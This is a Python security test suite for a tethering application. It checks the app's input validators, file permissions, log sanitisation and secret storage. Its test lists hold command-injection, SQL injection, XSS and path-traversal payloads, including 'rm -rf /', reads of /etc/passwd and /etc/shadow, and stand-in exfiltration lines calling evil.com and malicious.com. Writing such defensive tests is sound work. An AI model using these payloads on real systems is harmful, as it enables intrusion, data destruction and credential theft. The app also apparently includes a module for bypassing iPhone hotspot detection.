#!/usr/bin/env python3
"""
Security Testing Suite
Comprehensive testing of security features and vulnerability prevention
"""

import os
import sys
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

# Add src to path
sys.path.insert(0, "/app/src")

print("=" * 70)
print("P3 TESTING: SECURITY VULNERABILITY PREVENTION")
print("=" * 70)
print()

test_results = []

def test(name, func):
    """Run a test and track results"""
    try:
        func()
        test_results.append((name, True, None))
        print(f"✓ {name}")
        return True
    except AssertionError as e:
        test_results.append((name, False, str(e)))
        print(f"✗ {name}: {e}")
        return False
    except Exception as e:
        test_results.append((name, False, f"Exception: {e}"))
        print(f"✗ {name}: Exception - {e}")
        return False

# Test Suite 1: Input Validation Security
print("\n[1/4] INPUT VALIDATION SECURITY")
print("-" * 70)

def test_input_validators_import():
    """Test input validators import correctly"""
    from input_validators import (
        ValidationError, validate_ssid, validate_password, validate_ip_address,
        validate_port, validate_interface_name, validate_subprocess_args
    )
    
    assert ValidationError is not None, "ValidationError not available"
    assert validate_ssid is not None, "validate_ssid function not available"
    assert validate_password is not None, "validate_password function not available"

def test_command_injection_prevention():
    """Test prevention of command injection attacks"""
    from input_validators import validate_subprocess_args, ValidationError
    
    # Test malicious command injection attempts
    malicious_inputs = [
        ["ls", "-la", "; rm -rf /"],  # Command chaining
        ["ping", "-c", "1", "google.com; cat /etc/passwd"],  # Semicolon injection
        ["echo", "$(whoami)"],  # Command substitution
        ["netstat", "|", "grep", "LISTEN"],  # Pipe injection
        ["ls", "`id`"],  # Backtick command substitution
        ["ping", "-c", "1", "host && rm -f /tmp/*"],  # AND operator
        ["echo", "'$(reboot)'"],  # Quoted command substitution
    ]
    
    rejected_count = 0
    
    for malicious_cmd in malicious_inputs:
        try:
            validate_subprocess_args(malicious_cmd)
            print(f"  ⚠️  Command allowed (might be safe): {malicious_cmd[:2]}...")
        except ValidationError:
            rejected_count += 1
    
    # Should reject most/all malicious commands
    assert rejected_count > len(malicious_inputs) * 0.7, f"Only {rejected_count}/{len(malicious_inputs)} malicious commands rejected"

def test_sql_injection_prevention():
    """Test SQL injection prevention (if database functionality exists)"""
    # Check if any database-related code exists that needs protection
    try:
        from config_manager import ConfigManager
        
        config = ConfigManager()
        
        # Test with SQL injection attempts in config values
        sql_attacks = [
            "'; DROP TABLE users; --",
            "admin' OR '1'='1' --",
            "1' UNION SELECT * FROM passwords --",
            "'; INSERT INTO users VALUES('hacker','pass'); --"
        ]
        
        for attack in sql_attacks:
            try:
                # Try setting malicious config values
                config.set("proxy_host", attack)
                print(f"  ⚠️  SQL attack vector not caught: {attack[:20]}...")
            except Exception:
                # Should reject or sanitize malicious input
                pass
        
    except ImportError:
        print("  ℹ️  No database functionality found to test")

def test_path_traversal_prevention():
    """Test path traversal attack prevention"""
    from input_validators import ValidationError
    
    # Check if any file handling validates paths
    path_attacks = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "~/../../root/.ssh/id_rsa",
        "file:///etc/passwd",
        "\\\\server\\share\\file"
    ]
    
    # Test with any file-related operations
    try:
        from config_manager import ConfigManager
        
        config = ConfigManager()
        
        for attack_path in path_attacks:
            try:
                # Try to use malicious paths
                config.set("log_file", attack_path)
                print(f"  ⚠️  Path traversal not caught: {attack_path[:20]}...")
            except Exception:
                # Should reject or sanitize malicious paths
                pass
                
    except ImportError:
        print("  ℹ️  No file path configuration found to test")

def test_xss_prevention():
    """Test XSS prevention in user inputs"""
    from input_validators import validate_ssid, validate_password, ValidationError
    
    # XSS attack vectors
    xss_attacks = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "'><script>alert('xss')</script>",
        "<iframe src='javascript:alert(\"xss\")'></iframe>"
    ]
    
    rejected_count = 0
    
    for xss_attack in xss_attacks:
        try:
            validate_ssid(xss_attack)
            validate_password(xss_attack)
        except ValidationError:
            rejected_count += 1
    
    # Most XSS attacks should be rejected for network credentials
    assert rejected_count > 0, "No XSS attacks were rejected by input validators"

def test_buffer_overflow_prevention():
    """Test buffer overflow prevention"""
    from input_validators import validate_ssid, validate_password, ValidationError
    
    # Test extremely long inputs that might cause buffer overflows
    long_inputs = [
        "A" * 1000,     # 1KB string
        "B" * 10000,    # 10KB string  
        "C" * 100000,   # 100KB string
        "\x00" * 1000,  # Null bytes
        "Ñ" * 1000,     # Unicode that might expand
    ]
    
    rejected_count = 0
    
    for long_input in long_inputs:
        try:
            validate_ssid(long_input)
            validate_password(long_input)
            print(f"  ⚠️  Long input allowed: {len(long_input)} chars")
        except ValidationError:
            rejected_count += 1
    
    # Long inputs should be rejected to prevent buffer issues
    assert rejected_count > 0, "No excessively long inputs were rejected"

test("Input Validators Import", test_input_validators_import)
test("Command Injection Prevention", test_command_injection_prevention)
test("SQL Injection Prevention", test_sql_injection_prevention)
test("Path Traversal Prevention", test_path_traversal_prevention)
test("XSS Prevention", test_xss_prevention)
test("Buffer Overflow Prevention", test_buffer_overflow_prevention)

# Test Suite 2: Privilege Escalation Prevention
print("\n[2/4] PRIVILEGE ESCALATION PREVENTION")
print("-" * 70)

def test_subprocess_execution_security():
    """Test secure subprocess execution"""
    from connection_manager import ConnectionManager
    
    with patch('connection_manager.get_logger'), \
         patch('connection_manager.get_stats'), \
         patch('connection_manager.get_config'):
        
        conn_manager = ConnectionManager()
        
        # Test that subprocess execution uses safe methods
        assert hasattr(conn_manager, '_run_privileged'), "Privileged execution method not found"
        
        # Test with safe commands
        safe_commands = [
            ['echo', 'test'],
            ['ls', '/tmp'],
            ['pwd']
        ]
        
        for cmd in safe_commands:
            try:
                # This should use secure execution
                result = conn_manager._run_privileged(cmd, timeout=5)
                # Should complete without security issues
                assert result is not None, f"Safe command failed: {cmd}"
            except Exception as e:
                # Expected in test environment
                print(f"  ℹ️  Safe command test (expected in test): {cmd[0]} -> {type(e).__name__}")

def test_script_path_validation():
    """Test script path validation and security"""
    from connection_manager import ConnectionManager
    
    with patch('connection_manager.get_logger'), \
         patch('connection_manager.get_stats'), \
         patch('connection_manager.get_config'):
        
        conn_manager = ConnectionManager()
        
        # Test script path properties
        script_properties = [
            'connect_script',
            'disconnect_script', 
            'iphone_connect_script',
            'wifi_connect_script'
        ]
        
        for prop in script_properties:
            if hasattr(conn_manager, prop):
                script_path = getattr(conn_manager, prop)
                
                if script_path:
                    # Script should be in secure location
                    assert not script_path.startswith('/tmp/'), f"Script {prop} in insecure /tmp location"
                    assert not '/../' in script_path, f"Script {prop} has path traversal: {script_path}"
                    
                    # Should be absolute path for security
                    assert script_path.startswith('/'), f"Script {prop} should be absolute path"

def test_keyring_security():
    """Test keyring security and isolation"""
    try:
        from secret_store import SecretStore
        
        secret_store = SecretStore()
        
        # Test secure storage
        test_key = "test_security_key"
        test_value = "test_security_value"
        
        # Store secret
        secret_store.store_secret(test_key, test_value)
        
        # Retrieve secret
        retrieved = secret_store.get_secret(test_key)
        assert retrieved == test_value, "Secret storage/retrieval failed"
        
        # Test secure deletion
        secret_store.delete_secret(test_key)
        
        # Should no longer be accessible
        deleted_secret = secret_store.get_secret(test_key)
        assert deleted_secret is None or deleted_secret == "", "Secret not properly deleted"
        
    except ImportError:
        print("  ℹ️  Keyring/secret store functionality not available")
    except Exception as e:
        print(f"  ℹ️  Keyring test info: {e}")

def test_configuration_file_security():
    """Test configuration file security permissions"""
    from config_manager import ConfigManager
    import tempfile
    
    with tempfile.TemporaryDirectory() as temp_dir:
        config = ConfigManager(config_dir=temp_dir)
        
        # Create a config file
        config.set("test_security", "test_value")
        
        config_file = Path(temp_dir) / "config.json"
        
        if config_file.exists():
            # Check file permissions
            stat_info = config_file.stat()
            file_mode = oct(stat_info.st_mode)[-3:]  # Get last 3 digits
            
            # Should not be world-readable (6xx or 7xx)
            assert not file_mode.endswith('4') and not file_mode.endswith('6') and not file_mode.endswith('7'), \
                f"Config file has insecure permissions: {file_mode}"

def test_process_isolation():
    """Test process isolation and containment"""
    from connection_manager import ConnectionManager
    
    with patch('connection_manager.get_logger'), \
         patch('connection_manager.get_stats'), \
         patch('connection_manager.get_config'):
        
        conn_manager = ConnectionManager()
        
        # Test that processes are properly isolated
        if hasattr(conn_manager, 'executor'):
            executor = conn_manager.executor
            
            # Should use ThreadPoolExecutor or similar safe mechanism
            assert hasattr(executor, 'submit'), "Executor should have safe submit method"
            assert hasattr(executor, 'shutdown'), "Executor should have shutdown method"
            
            # Test process limits
            if hasattr(executor, '_max_workers'):
                max_workers = executor._max_workers
                assert max_workers is None or max_workers < 20, f"Too many workers: {max_workers}"

test("Subprocess Execution Security", test_subprocess_execution_security)
test("Script Path Validation", test_script_path_validation)
test("Keyring Security", test_keyring_security)
test("Configuration File Security", test_configuration_file_security)
test("Process Isolation", test_process_isolation)

# Test Suite 3: Network Security
print("\n[3/4] NETWORK SECURITY")
print("-" * 70)

def test_proxy_validation():
    """Test proxy configuration validation"""
    from input_validators import validate_ip_address, validate_port, ValidationError
    
    # Test valid proxy configurations
    valid_proxies = [
        ("192.168.49.1", 8000),
        ("10.0.0.1", 3128),
        ("127.0.0.1", 8080)
    ]
    
    for ip, port in valid_proxies:
        try:
            validate_ip_address(ip)
            validate_port(port)
        except ValidationError as e:
            assert False, f"Valid proxy rejected: {ip}:{port} - {e}"
    
    # Test invalid/malicious proxy configurations
    invalid_proxies = [
        ("999.999.999.999", 8000),  # Invalid IP
        ("192.168.1.1", 99999),     # Invalid port
        ("../../../etc/hosts", 8000),  # Path injection
        ("$(whoami)", 8000),        # Command injection
        ("0.0.0.0", 0),            # Invalid combinations
    ]
    
    rejected_count = 0
    
    for ip, port in invalid_proxies:
        try:
            validate_ip_address(ip)
            validate_port(port)
            print(f"  ⚠️  Invalid proxy allowed: {ip}:{port}")
        except ValidationError:
            rejected_count += 1
    
    assert rejected_count > 0, "No invalid proxy configurations were rejected"

def test_network_interface_security():
    """Test network interface name validation"""
    from input_validators import validate_interface_name, ValidationError
    
    # Test valid interface names
    valid_interfaces = [
        "eth0", "wlan0", "usb0", "enp0s3", "wlp2s0", "tun0"
    ]
    
    for interface in valid_interfaces:
        try:
            validate_interface_name(interface)
        except ValidationError as e:
            assert False, f"Valid interface rejected: {interface} - {e}"
    
    # Test malicious interface names
    malicious_interfaces = [
        "../../../proc/net/dev",  # Path traversal
        "$(rm -rf /)",           # Command injection
        "interface; cat /etc/passwd",  # Command chaining
        "\x00\x01\x02",         # Binary data
        "if" + "a" * 1000,      # Buffer overflow attempt
    ]
    
    rejected_count = 0
    
    for interface in malicious_interfaces:
        try:
            validate_interface_name(interface)
            print(f"  ⚠️  Malicious interface allowed: {interface[:20]}...")
        except ValidationError:
            rejected_count += 1
    
    assert rejected_count > 0, "No malicious interface names were rejected"

def test_ssid_password_security():
    """Test SSID and password security validation"""
    from input_validators import validate_ssid, validate_password, ValidationError
    
    # Test SQL injection in network credentials
    sql_injections = [
        "WiFi'; DROP TABLE networks; --",
        "admin' OR '1'='1",
        "network\" UNION SELECT password FROM users--"
    ]
    
    for injection in sql_injections:
        try:
            validate_ssid(injection)
            # SQL injection might be allowed in SSIDs (they're just network names)
            # But should be handled safely by the system
        except ValidationError:
            # Rejection is also acceptable
            pass
    
    # Test script injection in passwords
    script_injections = [
        "<script>alert('xss')</script>",
        "$(curl evil.com/steal-creds)",
        "`wget malicious.com/backdoor`",
        "password && echo 'pwned'"
    ]
    
    for injection in script_injections:
        try:
            validate_password(injection)
            # Password might allow various characters for compatibility
            # Key is that they're handled securely downstream
        except ValidationError:
            # Rejection is acceptable for security
            pass
    
    # Test length limits for DoS prevention
    very_long_input = "A" * 100000
    
    try:
        validate_ssid(very_long_input)
        print("  ⚠️  Very long SSID allowed")
    except ValidationError:
        # Should reject excessively long inputs
        pass

def test_dns_security():
    """Test DNS configuration security"""
    from input_validators import validate_ip_address, ValidationError
    
    # Test malicious DNS servers
    malicious_dns = [
        "0.0.0.0",           # Null route
        "127.0.0.1",         # Localhost (might be dangerous)
        "255.255.255.255",   # Broadcast
        "169.254.1.1",       # Link-local (might be dangerous)
        "192.168.1.1",       # Private IP (might be OK but worth checking)
    ]
    
    for dns_ip in malicious_dns:
        try:
            validate_ip_address(dns_ip)
            # Some of these might be legitimately allowed
        except ValidationError:
            # Rejection is also acceptable for security
            pass

def test_stealth_configuration_security():
    """Test stealth configuration security"""
    from config_manager import ConfigManager
    import tempfile
    
    with tempfile.TemporaryDirectory() as temp_dir:
        config = ConfigManager(config_dir=temp_dir)
        
        # Test stealth level bounds
        try:
            config.set("stealth_level", 999)  # Out of range
            assert False, "Invalid stealth level should be rejected"
        except Exception:
            # Should reject invalid stealth levels
            pass
        
        try:
            config.set("stealth_level", -1)  # Negative
            assert False, "Negative stealth level should be rejected"
        except Exception:
            # Should reject negative stealth levels
            pass

test("Proxy Validation", test_proxy_validation)
test("Network Interface Security", test_network_interface_security)
test("SSID Password Security", test_ssid_password_security)
test("DNS Security", test_dns_security)
test("Stealth Configuration Security", test_stealth_configuration_security)

# Test Suite 4: System Security
print("\n[4/4] SYSTEM SECURITY")
print("-" * 70)

def test_file_permission_security():
    """Test file permission security"""
    import tempfile
    from config_manager import ConfigManager
    
    with tempfile.TemporaryDirectory() as temp_dir:
        config = ConfigManager(config_dir=temp_dir)
        
        # Create some config files
        config.set("test_permission", "test_value")
        
        # Check directory permissions
        config_dir = Path(temp_dir)
        if config_dir.exists():
            stat_info = config_dir.stat()
            dir_mode = oct(stat_info.st_mode)[-3:]
            
            # Directory should not be world-readable/writable
            assert not dir_mode.endswith('7'), f"Config directory has world permissions: {dir_mode}"

def test_environment_variable_security():
    """Test environment variable security"""
    # Check for sensitive environment variables
    sensitive_env_vars = [
        'PDANET_PASSWORD',
        'PDANET_SECRET', 
        'PDANET_KEY',
        'PDANET_TOKEN'
    ]
    
    for var in sensitive_env_vars:
        env_value = os.environ.get(var)
        if env_value:
            print(f"  ⚠️  Sensitive environment variable found: {var}")
            # Should use secure storage instead of environment variables
        
    # Test that app doesn't expose sensitive data via environment
    # This is more of a code review than automated test

def test_log_security():
    """Test log security and sensitive data exposure"""
    from logger import get_logger
    
    logger = get_logger()
    
    # Test that sensitive data is not logged in plain text
    sensitive_data = [
        "password123",
        "secretkey456", 
        "192.168.1.100:8080@admin:password",
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ]
    
    # Check if logger has sanitization methods
    if hasattr(logger, 'sanitize_message'):
        for data in sensitive_data:
            sanitized = logger.sanitize_message(f"Connection using {data}")
            assert data not in sanitized, f"Sensitive data not sanitized: {data}"

def test_memory_security():
    """Test memory security and data clearing"""
    from config_manager import ConfigManager
    import tempfile
    
    with tempfile.TemporaryDirectory() as temp_dir:
        config = ConfigManager(config_dir=temp_dir)
        
        # Store sensitive data
        sensitive_password = "super_secret_password_12345"
        config.set("test_password", sensitive_password)
        
        # Clear the password
        config.set("test_password", "")
        
        # Check memory doesn't contain the old password
        # This is difficult to test automatically, but we can check basic cleanup
        new_password = config.get("test_password")
        assert new_password != sensitive_password, "Sensitive password not cleared from config"

def test_network_traffic_security():
    """Test network traffic security measures"""
    from iphone_hotspot_bypass import get_iphone_hotspot_bypass
    
    bypass = get_iphone_hotspot_bypass()
    
    # Test that bypass includes security measures
    status = bypass.get_bypass_status()
    
    # Check for security-related techniques
    security_techniques = ['dns_leak_prevention', 'ipv6_complete_block', 'tls_fingerprint_masking']
    
    if 'techniques' in status:
        available_techniques = status['techniques']
        
        if isinstance(available_techniques, (list, dict)):
            # Check if security techniques are available
            security_found = False
            
            for technique in security_techniques:
                if technique in str(available_techniques):
                    security_found = True
                    break
            
            # Should have some security-focused techniques
            if not security_found:
                print("  ℹ️  No explicit security techniques found in bypass status")

test("File Permission Security", test_file_permission_security)
test("Environment Variable Security", test_environment_variable_security)
test("Log Security", test_log_security)
test("Memory Security", test_memory_security)
test("Network Traffic Security", test_network_traffic_security)

# Test Results Summary
print("\n" + "=" * 70)
print("SECURITY TEST RESULTS")
print("=" * 70)

total_tests = len(test_results)
passed_tests = sum(1 for _, passed, _ in test_results if passed)
failed_tests = total_tests - passed_tests

print(f"Total Tests: {total_tests}")
print(f"Passed: {passed_tests}")
print(f"Failed: {failed_tests}")
print(f"Success Rate: {(passed_tests/total_tests*100):.1f}%")

if failed_tests > 0:
    print(f"\nFailed Tests:")
    for name, passed, error in test_results:
        if not passed:
            print(f"  ✗ {name}: {error}")

# Security Assessment
print(f"\n🛡️ Security Assessment: {'✅ SECURE' if failed_tests == 0 else '⚠️ NEEDS ATTENTION'}")

if failed_tests == 0:
    print("All security measures working correctly!")
    print("✓ Input validation prevents common attacks")
    print("✓ Subprocess execution is secured")
    print("✓ File permissions are appropriate") 
    print("✓ Network security measures in place")
else:
    print(f"{failed_tests} security issues found:")
    print("⚠️  Review failed tests for potential vulnerabilities")
    print("⚠️  Consider additional security hardening")

print("\n📋 Security Recommendations:")
print("• Regular security audits of new features")
print("• Penetration testing before production release")
print("• Monitor for new vulnerability patterns")
print("• Keep dependencies updated for security patches")

# Return appropriate exit code
exit(0 if failed_tests == 0 else 1)